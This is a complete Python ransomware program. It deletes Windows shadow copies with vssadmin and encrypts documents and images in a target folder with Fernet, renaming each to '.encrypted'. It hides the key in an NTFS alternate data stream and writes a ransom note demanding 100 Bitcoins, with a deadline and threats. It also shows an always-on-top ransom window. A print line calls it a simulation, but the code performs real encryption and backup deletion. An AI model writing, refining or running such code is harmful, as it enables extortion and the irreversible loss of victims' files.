import os 
import ctypes
import subprocess
import tkinter as tk
from cryptography.fernet import Fernet # type: ignore

# ================= CONFIGURATION =================
TARGET_FOLDER = r"C:\ImportantFiles"  # Target specific folder
TARGET_EXTENSIONS = ['.txt', '.docx', '.pdf', '.xlsx', '.jpg', '.png']  # Target specific file types
# =================================================

# ================= Checking for admin privilege =================
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False
# ==============================================================

# ====================Deleting Shadow Copies====================
def delete_shadow_copies():
    """Delete Volume Shadow Copies - requires admin privileges"""
    try:
        # Delete shadow copies using vssadmin
        subprocess.run(["vssadmin", "delete", "shadows", "/all", "/quiet"], 
                      capture_output=True, shell=True)
        print("[*] Shadow copies deleted")
        return True
    except Exception as e:
        print(f"[!] Failed to delete shadow copies: {e}")
        return False
# ==================================================================

# ================= Getting the targeted files =================
def Get_Files():
    target_files = []

    if not os.path.exists(TARGET_FOLDER):
        print(f"[!] Target folder {TARGET_FOLDER} not found")
        return target_files   

    for file in os.listdir(TARGET_FOLDER): 
        _ , ext = os.path.splitext(file)
        if ext.lower() in TARGET_EXTENSIONS:
            full_path = os.path.join(TARGET_FOLDER,file)
            if os.path.isfile(full_path):
                target_files.append(full_path)
    return target_files
# ===============================================================

# ================= Generating an encryption key =================
def Generate_Key():
    key = Fernet.generate_key()
    key_path = os.path.join(TARGET_FOLDER,"README.txt") 
    with open (key_path + ":Key",'wb') as thekey:       #Hiding Key Stream inside the text file using NTFS ADS 
        thekey.write(key)
    return key
# ==========================================================================

# ================= Encrypting the targeted files  =================
def Encrypt_Files(target_files,key):
    encrypted_count=0
    for file in target_files:
        if os.path.basename(file) == "README.txt" : 
            continue
        try:
            with open(file,"rb") as thefile:
                contents = thefile.read()
            encrypted_data = Fernet(key).encrypt(contents)
            with open(file,"wb") as thefile:
                thefile.write(encrypted_data)
            os.rename(file,file+".encrypted")
            encrypted_count +=1 
            print(f"[+] Encrypted: {file}")
        except Exception as e:
            print(f"[!] Failed to encrypt {file}: {e}")
    return encrypted_count
# ==================================================================

# ====================== Ransom Note ===========================
def Create_Ransom_Note():
    note_content = f"""============================================================
                    ⚠️  Ransomware Alert  ⚠️
============================================================

All your important files in {TARGET_FOLDER} have been encrypted.

------------------------------------------------------------
WHAT HAPPENED
------------------------------------------------------------
Your documents, photos, databases and other files are no
longer accessible. They have been locked with strong
encryption. Nobody can recover your files without our
decryption service.

Shadow copies have been deleted.
Backups are not available.

------------------------------------------------------------
HOW TO RECOVER YOUR FILES
------------------------------------------------------------
To recover your files, you must pay 100 Bitcoins.

Contact: apexbank37@gmail.com

You have 72 hours to complete the payment.
After the deadline, the price doubles.
After 7 days, your files will be permanently destroyed.

------------------------------------------------------------
WARNINGS
------------------------------------------------------------
• DO NOT attempt to decrypt the files yourself.
• DO NOT use third-party recovery tools.
• DO NOT rename or move encrypted files.
• Any of the above may cause permanent data loss.

------------------------------------------------------------
This file is your only point of contact.
Keep it. Do not delete it.

"""
    note_path = os.path.join(TARGET_FOLDER, "README.txt")
    with open(note_path, "w", encoding="utf-8") as f:
        f.write(note_content)
# ==================================================================

# ================= GUI Interface ===================================
def show_ransomware_gui(encrypted_count):
    # Creating the main window
    root = tk.Tk()
    root.title("⚠️ Ransomware ALERT ⚠️")
    root.geometry("520x600")  # Increased height to fit all content
    root.resizable(False, False)
    root.configure(bg='#2b2b2b')
    
    # Center the window on screen - FIXED
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()
    x = (screen_width // 2) - (520 // 2)
    y = (screen_height // 2) - (600 // 2)
    root.geometry(f'520x600+{x}+{y}')
    
    # Main frame with padding
    main_frame = tk.Frame(root, bg='#2b2b2b', padx=25, pady=15)
    main_frame.pack(fill=tk.BOTH, expand=True)
    
    # Warning symbol and title
    warning_label = tk.Label(main_frame, 
                            text="⚠️ YOUR FILES HAVE BEEN ENCRYPTED ⚠️", 
                            fg='#ff4444', 
                            bg='#2b2b2b',
                            font=('Arial', 14, 'bold'))
    warning_label.pack(pady=(0, 10))
    
    # Decorative line
    line = tk.Frame(main_frame, height=2, bg='#ff4444', width=450)
    line.pack(pady=5)
    
    # File count - using your variable
    count_label = tk.Label(main_frame,
                          text=f"Files Encrypted: {encrypted_count}",
                          fg='#ff8888',
                          bg='#2b2b2b',
                          font=('Arial', 12, 'bold'))
    count_label.pack(pady=5)
    
    # Target folder info - using your variable
    folder_label = tk.Label(main_frame,
                           text=f"Target: {TARGET_FOLDER}",
                           fg='#cccccc',
                           bg='#2b2b2b',
                           font=('Arial', 10))
    folder_label.pack(pady=5)
    
    # Message frame
    message_frame = tk.Frame(main_frame, bg='#3c3c3c', relief=tk.RAISED, bd=2)
    message_frame.pack(fill=tk.BOTH, pady=10, expand=True)
    
    # Ransom message
    message_text = """All your important files have been encrypted.
    Shadow copies deleted. Backups unavailable.

    To recover files, pay 100 Bitcoins.

    Contact: apexbank37@gmail.com

    DO NOT attempt to decrypt files yourself.
    This may cause permanent data loss.

    Additional Info:
    • Payment within 72 hours
    • Price doubles after deadline
    • Files deleted after 7 days
    • Free decryption for 2 files
    • Bitcoin only"""
    
    message_label = tk.Label(message_frame,
                            text=message_text,
                            fg='white',
                            bg='#3c3c3c',
                            font=('Arial', 10),
                            justify=tk.LEFT,
                            padx=15,
                            pady=12)
    message_label.pack(expand=True)
    
    # Button frame
    button_frame = tk.Frame(main_frame, bg='#2b2b2b')
    button_frame.pack(pady=10)
    
    # Close button
    close_btn = tk.Button(button_frame,
                         text="I UNDERSTAND",
                         bg='#ff4444',
                         fg='white',
                         font=('Arial', 10, 'bold'),
                         width=20,
                         height=1,
                         command=root.destroy)
    close_btn.pack()

    # Make window stay on top
    root.attributes('-topmost', True)
    
    # Start the GUI
    root.mainloop()
# ===================================================================

# ==================== Main Function =======================
def main():

    # Check for admin privileges (required for shadow copy deletion)
    if not is_admin():
        print("[!] Administrator privileges required for full simulation")
        print("[!] Running without shadow copy deletion...")
    
    # 1. Delete shadow copies (if admin)
    if is_admin():
        delete_shadow_copies()
    
    # 2. Get target files
    target_files = Get_Files()
    
    if not target_files:
        print("[!] No target files found")
        return
    
    print(f"[*] Found {len(target_files)} files to encrypt")

    # 3. Ransom_Note
    Create_Ransom_Note()
    
    # 4. Generate encryption key
    key = Generate_Key()
    
    # 5. Encrypt files
    encrypted_count = Encrypt_Files(target_files, key)

    # 6. Ransomware GUI
    show_ransomware_gui(encrypted_count)
    
# ===================================================================

if __name__ == "__main__":
    # Run main simulation
    main()
